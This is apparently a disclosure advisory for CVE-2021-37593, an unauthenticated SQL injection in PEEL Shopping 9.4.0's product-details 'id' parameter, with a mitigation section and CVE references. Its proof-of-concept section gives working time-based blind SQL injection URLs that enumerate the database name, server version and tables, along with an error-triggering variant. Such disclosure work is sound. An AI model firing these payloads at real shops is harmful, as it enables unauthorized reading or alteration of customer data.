**Vulnerability Name:** SQL Injection in "_produit_details.php?id_" parameter

**Date of Discovery:** 10 July 2021 

**Product version:** 9.4.0 . [Download link](https://drive.google.com/file/d/1FM8du7J6DDxE-LwVmH8JI502vvom-DUU/view?usp=sharing)

**Author:** faisalfs10x

**Vulnerability Description:** Public user/guest (unauthenticated) can inject malicious SQL query in order to affect the execution of predefined SQL commands via the "_id_" parameter on the "_/peel-shopping_9_4_0/achat/produit_details.php?id=[SQLi]_" endpoint. Upon successful of SQL injection attack, attacker can read sensitive data from the database or modify database data.

**Vulnerable URL:** _http://localhost/peel-shopping_9_4_0/achat/produit_details.php?id=[SQLi]_

**Proof of Concept:**

**1)** Assumed peel-shopping_9_4_0 out of box installation database name is _peel_. This query will check if _database()_ name like _hex(%peel%)_ - it will delay for 7 seconds before redirect to homepage (http://localhost/peel-shopping_9_4_0/) that indicates TRUE SQL statement which mean the database name like "_peel_".

**url :** http://localhost/peel-shopping_9_4_0/achat/produit_details.php?id=(SELECT+1337+FROM+(SELECT(SLEEP(7-(IF(DATABASE()+LIKE+0x257065656c25,0,5)))))FSXX) 

[PoC enum db name]
![enum_dbname](https://user-images.githubusercontent.com/51811615/125202026-5ac05480-e2a4-11eb-8aa8-0bd79718769f.png)


**2)** Assumed the web is using MariaDB database server - check if db_version like _hex(%MariaDB%)_, it will delay for 5 seconds if TRUE.

**url :** http://localhost/peel-shopping_9_4_0/achat/produit_details.php?id=(SELECT+1337+FROM+(SELECT(SLEEP(5-(IF(VERSION()+LIKE+0x254d61726961444225,0,5)))))FSXX)

[Poc enum MariaDB]
![enum_dbversion(MariaDB)](https://user-images.githubusercontent.com/51811615/125202107-b68add80-e2a4-11eb-8b16-5f03eedcb275.PNG)


**3)** By default, the database have a table name = peel_produits. This query will check if table_name _peel_produits_ is exist, it will delay for 10 seconds if TRUE, else will redirect to homepage instantly.

**url :** http://localhost/peel-shopping_9_4_0/achat/produit_details.php?id=(SELECT+1337+FROM+(SELECT(SLEEP(10-(IF(EXISTS(SELECT+3+FROM+peel.peel_produits),0,5)))))FSXX)

[PoC enum table peel_produits]
![enum_tablename](https://user-images.githubusercontent.com/51811615/125202148-d91cf680-e2a4-11eb-95fe-5dd3c633f285.png)


To produce SQL syntax error, it is possible to intercept the request before it is redirect to homepage using a tool like BurpSuite (repeater).

**Error syntax:** http://localhost/peel-shopping_9_4_0/achat/produit_details.php?id=(SELECT+1337+FROM+(SELdECT(SLEEP(3-(IF(USER()+LIKE+0xGEN_ERROR,0,5)))))ERR)

1. [MariaDB disclosed image]
![sql_error_mariadb](https://user-images.githubusercontent.com/51811615/125202162-e934d600-e2a4-11eb-8a08-9086e37f1706.png)

2. [peel_produits table_name disclosed]
![sql_errorbased2](https://user-images.githubusercontent.com/51811615/125202167-efc34d80-e2a4-11eb-9158-a66b2297eff3.png)

**Dump table name = peel_profil**

![dump_table_peel_profil](https://user-images.githubusercontent.com/51811615/125201991-2b114c80-e2a4-11eb-9c16-3a5197bcb51a.PNG)


**Consequences:** 

- Confidentiality: Since SQL databases generally hold sensitive data, loss of confidentiality is a frequent problem with SQL Injection vulnerabilities.
- Integrity: Just as it may be possible to read sensitive information eg client/customer sensitive data, it is also possible to make changes or even delete this information with a SQL Injection attack.

**Mitigation:** Use of Prepared Statements (with Parameterized Queries). It would be good also to casting integer to ensure only numerical data is inserted in 'id' parameter eg - intval($_GET['id'])

**References for Mitigation Vulnerability:** https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html

**References:** 
- https://github.com/advisto/peel-shopping/issues/3
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37593
- https://cve.report/CVE-2021-37593
- https://vuldb.com/?id.179759
- https://vulmon.com/vulnerabilitydetails?qid=CVE-2021-37593
- https://nvd.nist.gov/vuln/detail/CVE-2021-37593
